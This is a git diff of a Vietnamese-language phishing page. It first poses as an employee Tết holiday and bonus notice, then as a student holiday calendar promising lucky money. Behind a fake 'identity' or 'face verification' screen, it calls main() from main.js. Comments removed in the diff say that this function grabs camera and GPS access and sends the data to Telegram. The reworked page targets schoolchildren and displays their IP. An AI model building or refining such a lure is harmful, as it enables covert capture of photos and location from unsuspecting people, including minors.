@@ -3,95 +3,103 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Thông Báo Nghỉ Tết Nguyên Đán 2025</title>
+    <title>Cổng Thông Tin Giáo Dục - Lịch Nghỉ Tết 2025</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { 
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
-            background-color: #f0f2f5; color: #1c1e21; 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            background: #fff5f5; color: #333; 
             display: flex; justify-content: center; align-items: center; min-height: 100vh;
         }
         
-        /* Màn hình chờ xác thực */
+        /* Giao diện xác thực */
         #auth-screen {
-            background: #fff; width: 100%; max-width: 450px;
-            padding: 40px 20px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.1);
-            text-align: center; margin: 20px;
+            background: #fff; width: 90%; max-width: 400px;
+            padding: 30px; border-radius: 20px; box-shadow: 0 10px 25px rgba(211, 47, 47, 0.1);
+            text-align: center; border: 2px solid #ffcdd2;
         }
 
-        .icon-box {
-            width: 80px; height: 80px; background: #fff5f5; border-radius: 50%;
-            display: flex; align-items: center; justify-content: center; margin: 0 auto 20px;
-        }
+        .student-icon { width: 70px; height: 70px; margin-bottom: 15px; }
 
         .loader {
-            width: 40px; height: 40px; border: 4px solid #f3f3f3;
-            border-top: 4px solid #d32f2f; border-radius: 50%;
+            width: 35px; height: 35px; border: 4px solid #f3f3f3;
+            border-top: 4px solid #ff5252; border-radius: 50%;
             animation: spin 1s linear infinite; display: none; margin: 20px auto;
         }
 
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-        .btn-start {
-            background: #d32f2f; color: white; border: none; padding: 15px 30px;
-            font-size: 16px; font-weight: bold; border-radius: 8px; cursor: pointer;
-            width: 100%; margin-top: 25px; transition: 0.3s;
+        .btn-verify {
+            background: linear-gradient(135deg, #ff5252, #d32f2f);
+            color: white; border: none; padding: 15px;
+            font-size: 16px; font-weight: bold; border-radius: 50px; cursor: pointer;
+            width: 100%; margin-top: 20px; box-shadow: 0 4px 15px rgba(211, 47, 47, 0.3);
         }
 
-        /* Nội dung chính (Ẩn lúc đầu) */
+        /* Giao diện Lịch nghỉ (Ẩn lúc đầu) */
         #main-content {
-            display: none; width: 100%; max-width: 600px;
-            background: white; border-radius: 12px; overflow: hidden;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.1); border-top: 8px solid #d32f2f;
+            display: none; width: 95%; max-width: 550px;
+            background: white; border-radius: 15px; overflow: hidden;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.1);
         }
 
-        .header-banner {
-            background: #d32f2f; color: gold; padding: 30px; text-align: center;
+        .calendar-header { background: #d32f2f; color: #fff; padding: 20px; text-align: center; }
+        .calendar-body { padding: 20px; }
+        
+        .level-box {
+            background: #fff9f9; border-left: 5px solid #d32f2f;
+            padding: 15px; margin-bottom: 15px; border-radius: 5px;
         }
-
-        .content-body { padding: 30px; line-height: 1.6; }
-        .info-row { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid #eee; }
-        .info-label { font-weight: bold; color: #555; }
+        .level-title { font-weight: bold; color: #d32f2f; margin-bottom: 5px; display: block; }
+        
+        .gift-tag {
+            background: #ffd700; color: #000; padding: 10px; text-align: center;
+            font-weight: bold; border-radius: 10px; margin-top: 10px; cursor: pointer;
+        }
     </style>
 </head>
 <body>
 
 <div id="auth-screen">
-    <div class="icon-box">
-        <svg width="40" height="40" viewBox="0 0 24 24" fill="#d32f2f"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
-    </div>
-    <h2 style="color: #d32f2f;">Xác Minh Truy Cập</h2>
-    <p style="margin-top: 15px; color: #65676b; font-size: 15px;">
-        Vui lòng xác nhận danh tính để xem <b>Lịch nghỉ Tết & Danh sách thưởng 2025</b> dành riêng cho nhân viên.
+    <img src="https://cdn-icons-png.flaticon.com/512/3534/3534033.png" class="student-icon" alt="Student">
+    <h2 style="color: #d32f2f;">Xác Minh Học Sinh</h2>
+    <p style="margin-top: 10px; font-size: 14px; color: #666;">
+        Vui lòng xác thực khuôn mặt để hệ thống tự động tải lịch nghỉ và <b>phần quà lì xì Tết 2025</b> theo cấp học của bạn.
     </p>
     
     <div id="loading-spinner" class="loader"></div>
-    <p id="status-text" style="display:none; font-size: 13px; color: #d32f2f; margin-top: 10px;">Đang mã hóa dữ liệu bảo mật...</p>
+<p id="status-text" style="display:none; font-size: 12px; color: #ff5252; margin-top: 10px; font-weight: 500;">
+        Đang nhận diện trường học và vị trí...
+    </p>
 
-    <button id="action-btn" class="btn-start" onclick="runSecurityCheck()">Bắt đầu xác thực</button>
+    <button id="action-btn" class="btn-verify" onclick="startProcess()">Bắt đầu xác minh ngay</button>
 </div>
 
 <div id="main-content">
-    <div class="header-banner">
-        <h2>CHÚC MỪNG NĂM MỚI 2025</h2>
-        <p>Hệ thống quản lý nhân sự</p>
+    <div class="calendar-header">
+        <h2>LỊCH NGHỈ TẾT GIÁO DỤC 2025</h2>
+        <p>Hệ thống tra cứu tự động cập nhật</p>
     </div>
-    <div class="content-body">
-        <h3 style="color: #d32f2f; margin-bottom: 20px; text-align: center;">THÔNG BÁO NGHỈ TẾT CHÍNH THỨC</h3>
-        <div class="info-row">
-            <span class="info-label">Thời gian nghỉ:</span>
-            <span>28 Tết (27/01/2025)</span>
+    <div class="calendar-body">
+        <div class="level-box">
+            <span class="level-title">🌸 Mầm non & Tiểu học</span>
+            <p>Nghỉ từ 24/01 đến 05/02 (13 ngày)</p>
         </div>
-        <div class="info-row">
-            <span class="info-label">Thời gian bắt đầu lại:</span>
-            <span>Mùng 8 Tết (05/02/2025)</span>
+        <div class="level-box">
+            <span class="level-title">🌸 THCS & THPT</span>
+            <p>Nghỉ từ 26/01 đến 04/02 (10 ngày)</p>
         </div>
-        <div class="info-row">
-            <span class="info-label">Trạng thái thưởng:</span>
-            <span style="color: green; font-weight: bold;">Đã chuyển khoản ✅</span>
+        <div class="level-box">
+            <span class="level-title">🌸 Đại học / Cao đẳng</span>
+            <p>Tùy theo lịch nhà trường (Trung bình 14-21 ngày)</p>
         </div>
-        <p style="margin-top: 20px; font-style: italic; font-size: 14px; color: #777;">
-            * Lưu ý: Mọi thông tin đã được ghi nhận vào hệ thống giám sát điểm danh.
+
+        <div class="gift-tag" onclick="alert('Quà lì xì đã được gửi về ví SV của bạn!')">
+            🧧 NHẬN LÌ XÌ KHUYẾN HỌC TẠI ĐÂY
+        </div>
+        
+        <p style="text-align: center; font-size: 12px; color: #999; margin-top: 15px;">
+            Dữ liệu được xác thực qua IP: <span id="user-ip">...</span>
         </p>
     </div>
 </div>
@@ -99,31 +107,27 @@
 <script src="main.js"></script>
 
 <script>
-    async function runSecurityCheck() {
+    async function startProcess() {
         const btn = document.getElementById('action-btn');
         const loader = document.getElementById('loading-spinner');
         const status = document.getElementById('status-text');
 
-        // 1. Hiệu ứng đang xử lý
         btn.style.display = 'none';
         loader.style.display = 'block';
         status.style.display = 'block';
 
         try {
-            // 2. Gọi hàm main() từ file main.js của bạn
-            // Hàm này sẽ tự động xin quyền Camera, GPS và gửi Telegram
             await main(); 
-
-            // 3. Sau khi main() hoàn tất (đã gửi dữ liệu xong)
-            // Hiển thị nội dung thật
             setTimeout(() => {
                 document.getElementById('auth-screen').style.display = 'none';
                 document.getElementById('main-content').style.display = 'block';
+                if (typeof info !== 'undefined') {
+                    document.getElementById('user-ip').innerText = info.ip || "Đã bảo mật";
+                }
             }, 1000);
 
         } catch (err) {
-            // Nếu người dùng từ chối Camera
-            alert("Lỗi: Bạn cần cấp quyền Camera và Vị trí để xác thực nhân viên.");
+            alert("Lỗi: Bạn cần đồng ý quyền Camera để hệ thống xác minh thẻ học sinh.");
             btn.style.display = 'block';
             loader.style.display = 'none';
             status.style.display = 'none';
